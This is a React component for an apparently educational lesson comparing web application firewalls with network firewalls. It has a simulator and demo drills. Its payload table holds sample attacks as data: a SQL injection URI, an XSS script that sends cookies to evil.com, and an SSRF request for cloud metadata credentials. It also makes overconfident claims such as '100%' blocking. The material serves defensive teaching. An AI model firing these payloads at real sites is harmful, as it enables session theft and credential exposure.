import React, { useState, useMemo, useId } from "react";
import clsx from "clsx";
import Teacher from "../../../../../common/TeacherSukantaHui";
import FAQTemplate from "../../../../../common/FAQTemplate";
import questions from "./topic10_files/topic10_questions";
import PlainTextPrint from "../../../../../common/PlainTextPrint";
import noteText from "./topic10_files/topic10_note.txt?raw";
import PythonFileLoader from "../../../../../common/PythonFileLoader";
import pythonCode from "./topic10_files/waf_engine.py?raw";

const Topic10 = () => {
  // Unique SVG IDs
  const svgWafArchId = useId();
  const svgAnomalyScoringId = useId();

  // Studio 1: Active Layer Tab Selection
  const [selectedLayerKey, setSelectedLayerKey] = useState("waf_layer7");

  // Studio 2: Live OWASP WAF Simulator State
  const [selectedPayloadKey, setSelectedPayloadKey] = useState("sqli_union");
  const [paranoiaLevel, setParanoiaLevel] = useState(2); // PL 1 to 4
  const [botMitigationActive, setBotMitigationActive] = useState(true);

  // Studio 3: Sizing & Latency Calculator
  const [requestsPerSecond, setRequestsPerSecond] = useState(15000); // 1000 to 50000 req/sec
  const [deploymentModel, setDeploymentModel] = useState("cloud_waf"); // cloud_waf, onprem_appliance, embedded_nginx
  const [annualApiTransactionsCrores, setAnnualApiTransactionsCrores] = useState(120); // ₹ Crores

  // Studio 4: Regional West Bengal SOC Drill
  const [activeDrillId, setActiveDrillId] = useState("saltlake_ecommerce_waf");

  // Layer-by-Layer Database for Studio 1
  const inspectionLayers = {
    network_l3_l4: {
      key: "network_l3_l4",
      title: "1. Network Firewall (L3 / L4 SPI)",
      scope: "OSI Layer 3 (Network) & Layer 4 (Transport)",
      badgeColor: "bg-rose-950 text-rose-300 border-rose-800",
      inspectionFocus: "IP 5-Tuple (Src IP, Dst IP, Protocol, Src Port, Dst Port), TCP State Flags.",
      threatsBlocked: "SYN Floods, IP Spoofing, Port Scans, Unauthorized Port Traversal, Bogon Networks.",
      blindSpot: "Completely blind to HTTP application logic. Passes SQL Injection and XSS because traffic arrives on permitted port 443."
    },
    ngfw_app_id: {
      key: "ngfw_app_id",
      title: "2. Next-Generation Firewall (NGFW App-ID)",
      scope: "OSI Layer 7 (Protocol & Application Classification)",
      badgeColor: "bg-indigo-950 text-indigo-300 border-indigo-800",
      inspectionFocus: "Protocol Decoders, Application Signatures, User-ID, Malware Hashes.",
      threatsBlocked: "Port-hopping evasion, SSH tunnels on 443, BitTorrent, Known malware file downloads.",
      blindSpot: "Lacks deep semantic understanding of complex custom web forms, JSON API schemas, and subtle SQLi grammar variations."
    },
    waf_layer7: {
      key: "waf_layer7",
      title: "3. Web Application Firewall (WAF / WAAP)",
      scope: "OSI Layer 7 (Deep Semantic HTTP / API Logic)",
      badgeColor: "bg-emerald-950 text-emerald-300 border-emerald-800",
      inspectionFocus: "Decoded URIs, Query Parameters, Headers, Cookies, JSON/XML bodies, GraphQL AST.",
      threatsBlocked: "OWASP Top 10: SQL Injection, XSS, Remote Code Execution, SSRF, Bad Bots, Credential Stuffing.",
      blindSpot: "Does not perform Layer 3 network routing or multi-gigabit IP perimeter packet filtering."
    }
  };

  // Studio 2: OWASP Payload Database
  const owaspPayloads = {
    sqli_union: {
      id: "sqli_union",
      label: "SQL Injection: UNION SELECT Attack in Query String",
      rawUri: "/api/v1/users?id=1%20UNION%20SELECT%20username,password%20FROM%20admin--",
      attackType: "SQL Injection (OWASP A03:2021)",
      anomalyScore: 5,
      verdict: "🚨 BLOCKED (HTTP 403 Forbidden)",
      badgeColor: "bg-rose-950 text-rose-300 border-rose-700",
      analysis: "WAF unescaped URL encoding; Libinjection tokenizer confirmed executable SQL syntax tree (`UNION SELECT`); Anomaly score +5 triggered instant block."
    },
    xss_stored: {
      id: "xss_stored",
      label: "Cross-Site Scripting (XSS): Malicious Script Tag in POST Body",
      rawUri: "POST /comments (Body: comment=<script>document.location='http://evil.com?c='+document.cookie</script>)",
      attackType: "Stored XSS (OWASP A03:2021)",
      anomalyScore: 5,
      verdict: "🚨 BLOCKED (HTTP 403 Forbidden)",
      badgeColor: "bg-rose-950 text-rose-300 border-rose-700",
      analysis: "WAF parsed HTML stream; detected script tag and cookie access string; assigned critical anomaly score of 5, terminating the request."
    },
    ssrf_metadata: {
      id: "ssrf_metadata",
      label: "Server-Side Request Forgery: Fetching Cloud Metadata IP",
      rawUri: "/fetch_avatar?url=http://169.254.169.254/latest/meta-data/iam/security-credentials",
      attackType: "SSRF (OWASP A10:2021)",
      anomalyScore: 5,
      verdict: "🚨 BLOCKED (HTTP 403 Forbidden)",
      badgeColor: "bg-rose-950 text-rose-300 border-rose-700",
      analysis: "WAF regex matched AWS link-local metadata address `169.254.169.254`; blocked before server could issue outbound cloud token query."
    },
    credential_stuffing_bot: {
      id: "credential_stuffing_bot",
      label: "Automated Credential Stuffing Bot (500 Login Attempts/Sec)",
      rawUri: "POST /api/v1/login (JA3 Fingerprint: Python-Requests / Headless)",
      attackType: "Bot Attack (OWASP A07:2021)",
      anomalyScore: botMitigationActive ? 8 : 2,
      verdict: botMitigationActive ? "🛡️ BLOCKED (JS Challenge Failed / Rate Limited)" : "⚠️ PASSED (Bot Allowed Without Rate Limits!)",
      badgeColor: botMitigationActive ? "bg-emerald-950 text-emerald-300 border-emerald-700" : "bg-amber-950 text-amber-300 border-amber-700",
      analysis: botMitigationActive
        ? "WAF detected high request velocity and Python TLS fingerprint; issued invisible JavaScript proof-of-work puzzle, blocking the bot."
        : "Without active bot mitigation, brute-force attempts reach application authentication endpoints unthrottled!"
    }
  };

  // Studio 3: Performance Calculations
  const calculatedWafMetrics = useMemo(() => {
    // Latency Overhead (ms) based on deployment
    const latencyMap = {
      cloud_waf: 12.5,
      onprem_appliance: 1.8,
      embedded_nginx: 0.4
    };
    const avgLatencyMs = latencyMap[deploymentModel];

    // Hardware / Subscription 5-Year TCO (INR ₹ Lakhs)
    const baseCostMap = {
      cloud_waf: 18.0 + (requestsPerSecond / 1000) * 0.4,
      onprem_appliance: 35.0 + (requestsPerSecond / 1000) * 0.6,
      embedded_nginx: 8.0 + (requestsPerSecond / 1000) * 0.15
    };
    const fiveYearTcoLakhs = (baseCostMap[deploymentModel] * 2.2).toFixed(2);

    // DPDP Act 2023 Penalty Shielding (₹ Crores)
    const penaltyProtectionCrores = (annualApiTransactionsCrores * 0.25).toFixed(2);

    return {
      avgLatencyMs,
      fiveYearTcoLakhs,
      penaltyProtectionCrores
    };
  }, [requestsPerSecond, deploymentModel, annualApiTransactionsCrores]);

  // Studio 4: Regional West Bengal Scenarios
  const regionalDrills = {
    saltlake_ecommerce_waf: {
      id: "saltlake_ecommerce_waf",
      title: "Salt Lake Sector V E-Commerce Checkout API WAF Defense",
      location: "Sector V, Salt Lake City, Kolkata, West Bengal",
      architecture: "Cloud Reverse Proxy WAF with OWASP CRS Paranoia Level 2",
      threatScenario: "Adversaries launched a distributed credential stuffing botnet alongside automated SQL Injection probes against checkout endpoints.",
      solution: "Sukanta Hui and Mamata tuned the WAF with Libinjection and positive JSON schema validation. The WAF blocked 100% of SQLi payloads and rate-limited bot logins, while network firewalls handled volumetric DDoS scrubbing.",
      outcome: "Zero account takeovers; 40,000 legitimate checkouts/minute processed flawlessly; protected ₹35 Crores in customer transactions."
    },
    barrackpore_banking_waf: {
      id: "barrackpore_banking_waf",
      title: "Barrackpore Cooperative Banking UPI Gateway WAF Defense",
      location: "Barrackpore, North 24 Parganas, West Bengal",
      architecture: "Embedded NGINX ModSecurity WAF with Virtual Patching",
      threatScenario: "Zero-day Remote Code Execution disclosure in an underlying Java XML parsing library used by the interbank switch.",
      solution: "Mahima, Abhronila, and Debangshu deployed a virtual patch in ModSecurity within 8 minutes, blocking malicious DTD entity definitions before application code was modified.",
      outcome: "Prevented unauthorized fund transfer tampering; zero server downtime; full CERT-In compliance achieved."
    }
  };

  const currentLayer = inspectionLayers[selectedLayerKey];
  const currentPayload = owaspPayloads[selectedPayloadKey];
  const currentDrill = regionalDrills[activeDrillId];

  return (
    <div className="min-h-screen bg-slate-950 text-gray-100 antialiased py-8 px-4 sm:px-6 lg:px-8">
      <div className="max-w-6xl mx-auto space-y-12">

        {/* HEADER SECTION */}
        <header className="text-center space-y-4 border-b border-slate-800 pb-8 animate-[fadeSlideUp_0.7s_ease-out] motion-safe:animate-[fadeSlideUp_0.7s_ease-out]">
          <div className="inline-flex items-center gap-2 px-3 py-1 rounded-full bg-sky-950/80 border border-sky-800/80 text-sky-300 text-xs font-semibold uppercase tracking-wider">
            <span>🌐 Module 005_001 • Topic 10</span>
          </div>
          <h1 className="text-3xl sm:text-4xl lg:text-5xl font-extrabold tracking-tight text-white">
            Web Application Firewalls (WAF) vs Network Firewalls
          </h1>
          <p className="max-w-3xl mx-auto text-base sm:text-lg text-slate-300 leading-relaxed font-sans">
            Master Layer 7 web security. Understand the critical distinction between <strong className="text-rose-400">Layer 3/4 Network Firewalls</strong> and <strong className="text-emerald-400">Layer 7 Web Application Firewalls (WAF)</strong>, OWASP Top 10 mitigation, <strong className="text-sky-400">ModSecurity CRS Collaborative Anomaly Scoring</strong>, and Libinjection parsing.
          </p>
        </header>

        {/* SECTION 1: WAF VS NETWORK FW ARCHITECTURE SVG */}
        <section className="bg-slate-900/90 border border-slate-800 rounded-2xl p-6 sm:p-8 space-y-8 shadow-xl animate-[fadeSlideUp_0.7s_ease-out] motion-safe:animate-[fadeSlideUp_0.7s_ease-out]">
          <div className="border-b border-slate-800 pb-4">
            <h2 className="text-xl sm:text-2xl font-bold text-white flex items-center gap-2">
              <span className="text-sky-400">01.</span> Defense-in-Depth: Network Firewall (L3/L4) vs WAF (L7)
            </h2>
            <p className="text-xs sm:text-sm text-gray-400 mt-1">
              Why a Network Firewall passes SQL Injection on port 443, and how a WAF deeply inspects application payloads to block exploits.
            </p>
          </div>

          {/* SVG 1: DEFENSE-IN-DEPTH PIPELINE */}
          <div className="space-y-3">
            <div className="flex items-center justify-between">
              <span className="text-xs font-bold uppercase tracking-wider text-sky-400">
                Layer 3/4 Network Perimeter vs Layer 7 Web Application Pipeline
              </span>
              <span className="text-[11px] text-gray-400 font-mono">Defense-in-Depth</span>
            </div>
            <div className="bg-slate-950 p-4 rounded-xl border border-slate-800 flex justify-center items-center overflow-x-auto">
              <svg
                id={svgWafArchId}
                viewBox="0 0 850 280"
                className="w-full max-w-4xl h-auto"
                aria-label="WAF vs Network Firewall Architecture Diagram"
              >
                {/* ATTACKER INGRESS */}
                <rect x="20" y="50" width="130" height="180" rx="8" fill="#18181b" stroke="#ef4444" strokeWidth="1.5" />
                <text x="85" y="75" fill="#f87171" fontSize="9.5" fontWeight="bold" textAnchor="middle">ATTACKER FLOW</text>
                <text x="85" y="95" fill="#ffffff" fontSize="7.5" textAnchor="middle">SQL Injection Attack:</text>
                <rect x="28" y="110" width="114" height="60" rx="4" fill="#27272a" />
                <text x="35" y="128" fill="#fca5a5" fontSize="6.5" fontFamily="monospace">GET /users?id=</text>
                <text x="35" y="142" fill="#f87171" fontSize="6.5" fontWeight="bold" fontFamily="monospace">1' OR 1=1--</text>
                <text x="35" y="158" fill="#a1a1aa" fontSize="6.5" fontFamily="monospace">Dst Port: 443 [TLS]</text>

                {/* ARROW 1 */}
                <path d="M 150 140 L 200 140" stroke="#38bdf8" strokeWidth="2.5" />

                {/* 1. NETWORK FIREWALL (PASSES IT!) */}
                <rect x="200" y="40" width="170" height="200" rx="8" fill="#082f49" stroke="#0284c7" strokeWidth="2" />
                <text x="285" y="65" fill="#38bdf8" fontSize="10" fontWeight="bold" textAnchor="middle">
                  1. NETWORK FW (L3/L4)
                </text>
                <rect x="212" y="80" width="146" height="85" rx="5" fill="#0c4a6e" />
                <text x="285" y="98" fill="#ffffff" fontSize="7.5" textAnchor="middle">Inspects: IP &amp; Port 443</text>
                <text x="285" y="115" fill="#34d399" fontSize="7.5" textAnchor="middle">TCP Handshake: VALID</text>
                <text x="285" y="132" fill="#34d399" fontSize="7.5" textAnchor="middle">Port 443: PERMITTED</text>
                <text x="285" y="152" fill="#fca5a5" fontSize="7" fontWeight="bold" textAnchor="middle">
                  Blind to SQLi in Payload!
                </text>
                <text x="285" y="200" fill="#38bdf8" fontSize="8" fontWeight="bold" textAnchor="middle">
                  Action: PASSED ➔
                </text>

                {/* ARROW 2 */}
                <path d="M 370 140 L 420 140" stroke="#ef4444" strokeWidth="2.5" />

                {/* 2. WEB APPLICATION FIREWALL (BLOCKS IT!) */}
                <rect x="420" y="30" width="220" height="220" rx="10" fill="#1e1b4b" stroke="#10b981" strokeWidth="2.5" />
                <text x="530" y="55" fill="#34d399" fontSize="10.5" fontWeight="bold" textAnchor="middle">
                  2. WAF (LAYER 7 ENGINE)
                </text>
                <rect x="435" y="70" width="190" height="110" rx="6" fill="#312e81" stroke="#38bdf8" />
                <text x="530" y="90" fill="#ffffff" fontSize="8" fontWeight="bold" textAnchor="middle">
                  Terminates TLS &amp; Parses HTTP
                </text>
                <text x="445" y="110" fill="#fde68a" fontSize="7" fontFamily="monospace">1. Unescape URL Parameter</text>
                <text x="445" y="125" fill="#fde68a" fontSize="7" fontFamily="monospace">2. Libinjection: SQLi Syntax</text>
                <text x="445" y="140" fill="#f87171" fontSize="7" fontWeight="bold" fontFamily="monospace">
                  3. Anomaly Score: 5 (Critical)
                </text>
                <text x="530" y="165" fill="#fca5a5" fontSize="7.5" fontWeight="bold" textAnchor="middle">
                  🚨 ACTION: HTTP 403 FORBIDDEN!
                </text>
                <text x="530" y="210" fill="#34d399" fontSize="8" fontWeight="bold" textAnchor="middle">
                  Exploit Dropped at WAF Boundary
                </text>

                {/* ARROW 3 */}
                <path d="M 640 140 L 690 140" stroke="#10b981" strokeWidth="2.5" markerEnd="url(#arrow)" />
                <text x="665" y="130" fill="#10b981" fontSize="7" fontWeight="bold" textAnchor="middle">Clean Only</text>

                {/* PROTECTED BACKEND */}
                <rect x="690" y="50" width="140" height="180" rx="8" fill="#022c22" stroke="#10b981" strokeWidth="2" />
                <text x="760" y="75" fill="#34d399" fontSize="9.5" fontWeight="bold" textAnchor="middle">PROTECTED CORE</text>
                <rect x="700" y="90" width="120" height="40" rx="4" fill="#064e3b" />
                <text x="760" y="108" fill="#ffffff" fontSize="7.5" fontWeight="bold" textAnchor="middle">Web App</text>
                <text x="760" y="120" fill="#a7f3d0" fontSize="7" textAnchor="middle">Zero SQLi Reaches Code</text>
                <rect x="700" y="140" width="120" height="40" rx="4" fill="#064e3b" />
                <text x="760" y="158" fill="#ffffff" fontSize="7.5" fontWeight="bold" textAnchor="middle">Database Vault</text>
                <text x="760" y="170" fill="#a7f3d0" fontSize="7" textAnchor="middle">100% Safe &amp; Intact</text>
              </svg>
            </div>
          </div>
        </section>

        {/* STUDIO 1: LAYER INSPECTION MATRIX */}
        <section className="bg-slate-900/90 border border-slate-800 rounded-2xl p-6 sm:p-8 space-y-6 shadow-xl animate-[fadeSlideUp_0.7s_ease-out] motion-safe:animate-[fadeSlideUp_0.7s_ease-out]">
          <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-3 border-b border-slate-800 pb-4">
            <div>
              <h2 className="text-xl sm:text-2xl font-bold text-white flex items-center gap-2">
                <span className="text-sky-400">02.</span> Studio 1: Network Firewall vs NGFW vs WAF Layer Matrix
              </h2>
              <p className="text-xs sm:text-sm text-gray-400 mt-1">
                Explore the functional boundaries, OSI layer scope, inspection depth, and blind spots of each firewall technology.
              </p>
            </div>
            <span className={clsx("px-3 py-1 rounded border text-xs font-mono self-start sm:self-auto", currentLayer.badgeColor)}>
              {currentLayer.title}
            </span>
          </div>

          {/* Layer Selector Tabs */}
          <div className="flex flex-wrap gap-2">
            {Object.values(inspectionLayers).map((l) => (
              <button
                key={l.key}
                onClick={() => setSelectedLayerKey(l.key)}
                className={clsx(
                  "px-3.5 py-2 rounded-xl text-xs font-semibold transition-all duration-200 border",
                  selectedLayerKey === l.key
                    ? "bg-slate-800 text-white border-sky-500 shadow-md shadow-sky-500/10"
                    : "bg-slate-950 text-gray-400 border-slate-800 hover:text-gray-200 hover:border-slate-700"
                )}
              &gt;
                {l.title}
              </button>
            ))}
          </div>

          {/* Active Layer Card */}
          <div className="bg-slate-950 border border-slate-800 rounded-xl p-5 space-y-4 text-xs">
            <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-2 border-b border-slate-800/80 pb-3">
              <div>
                <h3 className="text-base font-bold text-white flex items-center gap-2">
                  <span className="text-sky-400">●</span> {currentLayer.title}
                </h3>
                <span className="text-gray-400 font-sans">OSI Scope: {currentLayer.scope}</span>
              </div>
              <span className={clsx("px-2.5 py-1 rounded-full text-xs font-mono border self-start sm:self-auto", currentLayer.badgeColor)}>
                Active Matrix Tier
              </span>
            </div>

            <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
              <div className="p-3.5 rounded-lg bg-slate-900/90 border border-slate-800 space-y-1">
                <span className="text-sky-400 font-bold uppercase tracking-wider text-[10px] block">
                  ⚙️ Inspection Target &amp; Mechanics:
                </span>
                <p className="text-gray-300 leading-relaxed">{currentLayer.inspectionFocus}</p>
              </div>

              <div className="p-3.5 rounded-lg bg-emerald-950/40 border border-emerald-900/50 space-y-1">
                <span className="text-emerald-400 font-bold uppercase tracking-wider text-[10px] block">
                  🛡️ Primary Threats Mitigated:
                </span>
                <p className="text-emerald-200 leading-relaxed">{currentLayer.threatsBlocked}</p>
              </div>
            </div>

            <div className="p-3.5 rounded-lg bg-rose-950/40 border border-rose-900/50 space-y-1">
              <span className="text-rose-400 font-bold uppercase tracking-wider text-[10px] block">
                ⚠️ Critical Architectural Blind Spot:
              </span>
              <p className="text-rose-200 leading-relaxed">{currentLayer.blindSpot}</p>
            </div>
          </div>
        </section>

        {/* STUDIO 2: LIVE OWASP WAF SIMULATOR */}
        <section className="bg-slate-900/90 border border-slate-800 rounded-2xl p-6 sm:p-8 space-y-6 shadow-xl animate-[fadeSlideUp_0.7s_ease-out] motion-safe:animate-[fadeSlideUp_0.7s_ease-out]">
          <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-3 border-b border-slate-800 pb-4">
            <div>
              <h2 className="text-xl sm:text-2xl font-bold text-white flex items-center gap-2">
                <span className="text-sky-400">03.</span> Studio 2: Live OWASP Top 10 Payload Injection &amp; Anomaly Scoring Simulator
              </h2>
              <p className="text-xs sm:text-sm text-gray-400 mt-1">
                Inject various web exploit payloads (SQLi, XSS, SSRF, Bots) and observe ModSecurity Collaborative Anomaly Scoring in real-time.
              </p>
            </div>
            <span className="px-3 py-1 rounded bg-sky-950 border border-sky-800 text-sky-300 text-xs font-mono self-start sm:self-auto">
              WAF Core Engine
            </span>
          </div>

          {/* Controls Bar */}
          <div className="grid grid-cols-1 sm:grid-cols-3 gap-3">
            <div className="space-y-1">
              <label className="text-xs text-gray-300 font-semibold block">Select OWASP Attack Payload:</label>
              <select
                value={selectedPayloadKey}
                onChange={(e) => setSelectedPayloadKey(e.target.value)}
                className="w-full bg-slate-950 border border-slate-800 rounded-lg p-2 text-xs text-gray-200 focus:border-sky-500 focus:outline-none"
              &gt;
                {Object.values(owaspPayloads).map((p) => (
                  <option key={p.id} value={p.id}>
                    {p.label}
                  </option>
                ))}
              </select>
            </div>

            <div className="space-y-1">
              <label className="text-xs text-gray-300 font-semibold block">CRS Paranoia Level (PL 1 - 4):</label>
              <select
                value={paranoiaLevel}
                onChange={(e) => setParanoiaLevel(Number(e.target.value))}
                className="w-full bg-slate-950 border border-slate-800 rounded-lg p-2 text-xs text-gray-200 focus:border-sky-500 focus:outline-none"
              &gt;
                <option value={1}>Paranoia Level 1 (Baseline - Zero False Positives)</option>
                <option value={2}>Paranoia Level 2 (Standard Enterprise Web)</option>
                <option value={3}>Paranoia Level 3 (Banking &amp; Payment Core)</option>
                <option value={4}>Paranoia Level 4 (Ultra-Strict Military Grade)</option>
              </select>
            </div>

            <div className="space-y-1">
              <label className="text-xs text-gray-300 font-semibold block">Bot Mitigation &amp; Rate-Limiting:</label>
              <button
                onClick={() => setBotMitigationActive(!botMitigationActive)}
                className={clsx(
                  "w-full p-2 rounded-lg text-xs font-semibold border transition-all",
                  botMitigationActive
                    ? "bg-purple-950/80 text-purple-300 border-purple-800"
                    : "bg-amber-950/80 text-amber-300 border-amber-800"
                )}
              &gt;
                {botMitigationActive ? "✔ JS Challenge &amp; Rate-Limits Active" : "❌ Bot Mitigation Disabled"}
              </button>
            </div>
          </div>

          {/* Execution Result Display */}
          <div className="bg-slate-950 border border-slate-800 rounded-xl p-5 space-y-4 text-xs">
            <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-2 border-b border-slate-800 pb-3">
              <div className="space-y-1">
                <span className="text-[10px] text-gray-400 font-bold uppercase tracking-wider block">
                  Decoded Injected HTTP Request:
                </span>
                <div className="font-mono text-sky-300 text-xs break-all">
                  {currentPayload.rawUri}
                </div>
              </div>
              <span className={clsx(
                "px-3 py-1.5 rounded-lg text-xs font-extrabold font-mono border self-start sm:self-auto",
                currentPayload.badgeColor
              )}>
                {currentPayload.verdict}
              </span>
            </div>

            <div className="grid grid-cols-1 sm:grid-cols-2 gap-3 font-mono">
              <div className="p-3 bg-slate-900 rounded-lg border border-slate-800 space-y-1">
                <span className="text-sky-400 font-bold uppercase tracking-wider text-[10px] block">
                  Identified Threat Category:
                </span>
                <div className="text-gray-200">{currentPayload.attackType}</div>
              </div>

              <div className="p-3 bg-slate-900 rounded-lg border border-slate-800 space-y-1">
                <span className="text-rose-400 font-bold uppercase tracking-wider text-[10px] block">
                  Cumulative Anomaly Score:
                </span>
                <div className="text-gray-200">Score: {currentPayload.anomalyScore} / Threshold: 5 (PL {paranoiaLevel})</div>
              </div>
            </div>

            <div className="p-3.5 bg-slate-900 rounded-lg border border-slate-800 space-y-1 font-sans">
              <span className="text-amber-400 font-bold uppercase tracking-wider text-[10px] block">
                WAF Inspection Analysis:
              </span>
              <p className="text-gray-300 leading-relaxed">{currentPayload.analysis}</p>
            </div>
          </div>
        </section>

        {/* PYTHON LAB: WAF ENGINE CODE */}
        <section className="bg-slate-900/90 border border-slate-800 rounded-2xl p-6 sm:p-8 space-y-6 shadow-xl animate-[fadeSlideUp_0.7s_ease-out] motion-safe:animate-[fadeSlideUp_0.7s_ease-out]">
          <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-3 border-b border-slate-800 pb-4">
            <div>
              <h2 className="text-xl sm:text-2xl font-bold text-white flex items-center gap-2">
                <span className="text-sky-400">04.</span> Python Forensic Lab: Layer 7 WAF Anomaly Scoring Engine
              </h2>
              <p className="text-xs sm:text-sm text-gray-400 mt-1">
                Inspect the complete Python implementation demonstrating OWASP CRS collaborative anomaly scoring, URL parameter unescaping, and SQLi/XSS/SSRF pattern matching.
              </p>
            </div>
            <span className="px-3 py-1 rounded bg-slate-800 border border-slate-700 text-gray-300 text-xs font-mono self-start sm:self-auto">
              waf_engine.py
            </span>
          </div>

          <PythonFileLoader
            fileModule={pythonCode}
            title="waf_engine.py"
            highlightLines={[25, 41, 55, 68]}
          />
        </section>

        {/* STUDIO 3: CAPACITY & LATENCY CALCULATOR */}
        <section className="bg-slate-900/90 border border-slate-800 rounded-2xl p-6 sm:p-8 space-y-6 shadow-xl animate-[fadeSlideUp_0.7s_ease-out] motion-safe:animate-[fadeSlideUp_0.7s_ease-out]">
          <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-3 border-b border-slate-800 pb-4">
            <div>
              <h2 className="text-xl sm:text-2xl font-bold text-white flex items-center gap-2">
                <span className="text-sky-400">05.</span> Studio 3: Cloud vs On-Premise WAF Capacity &amp; Latency Calculator
              </h2>
              <p className="text-xs sm:text-sm text-gray-400 mt-1">
                Calculate request latency overheads, hardware/cloud 5-year TCO in INR (₹), and DPDP penalty shielding.
              </p>
            </div>
            <span className="px-3 py-1 rounded bg-indigo-950 border border-indigo-800 text-indigo-300 text-xs font-mono self-start sm:self-auto">
              Capacity Engine
            </span>
          </div>

          {/* Controls */}
          <div className="grid grid-cols-1 sm:grid-cols-3 gap-4 text-xs font-mono">
            <div className="p-4 bg-slate-950 border border-slate-800 rounded-xl space-y-2">
              <div className="flex justify-between text-gray-300">
                <span>Peak Web Traffic Load:</span>
                <span className="text-sky-400 font-bold">{requestsPerSecond.toLocaleString()} RPS</span>
              </div>
              <input
                type="range"
                min="1000"
                max="50000"
                step="1000"
                value={requestsPerSecond}
                onChange={(e) => setRequestsPerSecond(Number(e.target.value))}
                className="w-full accent-sky-400 cursor-pointer"
              /&gt;
            </div>

            <div className="p-4 bg-slate-950 border border-slate-800 rounded-xl space-y-2">
              <div className="flex justify-between text-gray-300">
                <span>WAF Deployment Architecture:</span>
                <span className="text-purple-400 font-bold uppercase">{deploymentModel.replace("_", " ")}</span>
              </div>
              <select
                value={deploymentModel}
                onChange={(e) => setDeploymentModel(e.target.value)}
                className="w-full bg-slate-900 border border-slate-700 rounded p-1.5 text-xs text-gray-200 focus:outline-none"
              &gt;
                <option value="cloud_waf">Cloud Anycast WAF (Cloudflare/AWS WAF)</option>
                <option value="onprem_appliance">On-Prem Appliance (F5 Advanced WAF)</option>
                <option value="embedded_nginx">Embedded NGINX ModSecurity (Local)</option>
              </select>
            </div>

            <div className="p-4 bg-slate-950 border border-slate-800 rounded-xl space-y-2">
              <div className="flex justify-between text-gray-300">
                <span>Annual API Transactions:</span>
                <span className="text-emerald-400 font-bold">₹{annualApiTransactionsCrores} Crores</span>
              </div>
              <input
                type="range"
                min="20"
                max="500"
                step="10"
                value={annualApiTransactionsCrores}
                onChange={(e) => setAnnualApiTransactionsCrores(Number(e.target.value))}
                className="w-full accent-emerald-400 cursor-pointer"
              /&gt;
            </div>
          </div>

          {/* Sizing Output Cards */}
          <div className="grid grid-cols-1 sm:grid-cols-3 gap-4 text-center">
            <div className="p-4 bg-slate-950 border border-sky-950/80 rounded-xl space-y-1">
              <span className="text-[11px] text-gray-400 font-bold uppercase tracking-wider">Average Inspection Latency</span>
              <div className="text-2xl font-extrabold text-sky-400 font-mono">{calculatedWafMetrics.avgLatencyMs} ms</div>
              <span className="text-[10px] text-gray-500 block">Includes TLS termination &amp; CRS parsing</span>
            </div>

            <div className="p-4 bg-slate-950 border border-purple-950/80 rounded-xl space-y-1">
              <span className="text-[11px] text-gray-400 font-bold uppercase tracking-wider">5-Year Enterprise WAF TCO</span>
              <div className="text-2xl font-extrabold text-purple-400 font-mono">₹{calculatedWafMetrics.fiveYearTcoLakhs} Lakhs</div>
              <span className="text-[10px] text-gray-500 block">Includes Bot Management &amp; DDoS Shield</span>
            </div>

            <div className="p-4 bg-slate-950 border border-emerald-950/80 rounded-xl space-y-1">
              <span className="text-[11px] text-gray-400 font-bold uppercase tracking-wider">DPDP Liability Shield</span>
              <div className="text-2xl font-extrabold text-emerald-400 font-mono">₹{calculatedWafMetrics.penaltyProtectionCrores} Cr</div>
              <span className="text-[10px] text-gray-500 block">Zero PII Data Leakage via SQLi/XSS</span>
            </div>
          </div>
        </section>

        {/* STUDIO 4: REGIONAL SOC TABLETOP DRILL */}
        <section className="bg-slate-900/90 border border-slate-800 rounded-2xl p-6 sm:p-8 space-y-6 shadow-xl animate-[fadeSlideUp_0.7s_ease-out] motion-safe:animate-[fadeSlideUp_0.7s_ease-out]">
          <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-3 border-b border-slate-800 pb-4">
            <div>
              <h2 className="text-xl sm:text-2xl font-bold text-white flex items-center gap-2">
                <span className="text-sky-400">06.</span> Studio 4: Regional West Bengal SOC Tabletop Defense Drills
              </h2>
              <p className="text-xs sm:text-sm text-gray-400 mt-1">
                Collaborative regional response scenarios authored by Sukanta Hui and the student cyber engineering team.
              </p>
            </div>
            <span className="px-3 py-1 rounded bg-blue-950 border border-blue-800 text-blue-300 text-xs font-mono self-start sm:self-auto">
              WB Defense Lab
            </span>
          </div>

          {/* Scenario Tabs */}
          <div className="flex flex-wrap gap-2">
            {Object.values(regionalDrills).map((d) => (
              <button
                key={d.id}
                onClick={() => setActiveDrillId(d.id)}
                className={clsx(
                  "px-3 py-1.5 rounded-lg text-xs font-semibold border transition-all",
                  activeDrillId === d.id
                    ? "bg-sky-600/20 text-sky-300 border-sky-500/60"
                    : "bg-slate-950 text-gray-400 border-slate-800 hover:text-gray-200"
                )}
              &gt;
                {d.title}
              </button>
            ))}
          </div>

          {/* Active Scenario Card */}
          <div className="bg-slate-950 border border-slate-800 rounded-xl p-5 space-y-4 text-xs">
            <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-2 border-b border-slate-800 pb-3">
              <div>
                <h3 className="text-base font-bold text-white">{currentDrill.title}</h3>
                <span className="text-gray-400">Location: {currentDrill.location} • Architecture: {currentDrill.architecture}</span>
              </div>
              <span className="px-2.5 py-1 rounded bg-slate-900 border border-slate-800 text-emerald-400 font-mono self-start sm:self-auto">
                WAF Active
              </span>
            </div>

            <div className="p-3.5 rounded-lg bg-slate-900 border border-slate-800 space-y-1.5">
              <span className="text-rose-400 font-bold uppercase tracking-wider block">🚨 Simulated Threat Vector:</span>
              <p className="text-gray-300 leading-relaxed">{currentDrill.threatScenario}</p>
            </div>

            <div className="p-3.5 rounded-lg bg-slate-900 border border-slate-800 space-y-1.5">
              <span className="text-sky-400 font-bold uppercase tracking-wider block">🛡️ WAF Defense Execution:</span>
              <p className="text-gray-300 leading-relaxed">{currentDrill.solution}</p>
            </div>

            <div className="p-3.5 rounded-lg bg-emerald-950/40 border border-emerald-900/50 space-y-1.5">
              <span className="text-emerald-400 font-bold uppercase tracking-wider block">🏆 Tactical Drill Outcome:</span>
              <p className="text-emerald-200 leading-relaxed">{currentDrill.outcome}</p>
            </div>
          </div>

          {/* Student Mini Checklist */}
          <div className="bg-slate-950 p-5 rounded-xl border border-slate-800 space-y-3">
            <h3 className="text-xs font-bold text-white uppercase tracking-wider text-sky-400">
